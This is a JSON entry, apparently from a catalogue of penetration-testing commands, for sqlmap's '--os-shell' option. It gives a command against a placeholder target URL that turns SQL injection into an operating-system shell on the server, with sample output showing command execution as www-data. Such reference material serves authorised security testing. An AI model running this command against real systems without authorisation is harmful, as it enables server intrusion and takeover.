    "id": "sqlmap-os-shell",
    "tool": "sqlmap",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "sqlmap -u 'http://<target>/page?id=1' --os-shell",
    "name": "SQLMap OS Shell",
    "description": "Attempts to get an operating system shell through SQL injection.",
    "arguments": {
      "--os-shell": "Get OS command execution via SQLi"
    },
    "expected_output": "os-shell> whoami\nwww-data",
    "use_case": "Escalate SQL injection to full command execution on the server.",
